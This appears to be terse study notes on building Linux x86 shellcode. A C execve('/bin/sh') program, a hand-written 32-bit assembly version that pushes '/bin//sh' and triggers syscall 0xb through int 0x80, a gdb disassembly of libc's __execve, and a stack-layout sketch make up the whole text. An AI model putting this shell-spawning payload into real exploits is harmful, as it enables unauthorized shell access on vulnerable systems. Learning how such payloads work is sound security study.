#include <stdio.h>

int main()
{
    char *buf[] = {"/bin/sh", 0};
    execve(buf[0], buf, 0);
    return 0;
}



.intel_syntax noprefix
.global main
main:
    //arg3 : edx
    xor edx, edx
    
    //arg1 -> "/bin/sh"
    push edx
    push 0x68732f2f
    push 0x6e69622f    
    mov ebx, esp
    
    //arg2 -> ecx
    push edx
    push ebx
    mov ecx, esp

    //int
    xor eax, eax
    mov al, 0xb
    int 0x80

    

0x804d062 <__execve+22>:	mov    0xc(%ebp),%ecx
0x804d065 <__execve+25>:	mov    0x10(%ebp),%edx
0x804d068 <__execve+28>:	push   %ebx
0x804d069 <__execve+29>:	mov    %edi,%ebx
0x804d06b <__execve+31>:	mov    $0xb,%eax
0x804d070 <__execve+36>:	int    $0x80




sfp
ret
arg1 ;sfp+8 ebx
arg2 ;sfp+c ecx
arg3 :sfp+10 edx